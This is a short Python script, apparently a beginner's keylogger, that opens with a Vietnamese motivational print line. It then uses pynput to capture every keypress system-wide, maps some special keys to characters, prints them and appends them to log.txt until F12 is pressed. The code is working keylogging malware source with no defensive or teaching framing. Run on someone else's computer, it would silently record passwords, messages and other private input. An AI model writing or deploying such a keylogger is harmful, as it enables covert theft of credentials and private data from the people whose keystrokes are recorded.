
print("Không gì là không thể với những ai luôn kiên trì")
import time
from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")

    if key == "Key.f12":
        raise SystemExit(0)

    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = ""
    if key == "Key.tab":
        key = "\t"
    if key == "Key.backspace":
        key = "\b"
    if key == "Key.space":
        key = " "


    print(key, end='')

    with open("log.txt", "a", encoding='utf-8') as file:
        file.writelines(key)

with Listener(on_press=anonymous) as listener:
    listener.join()

input()

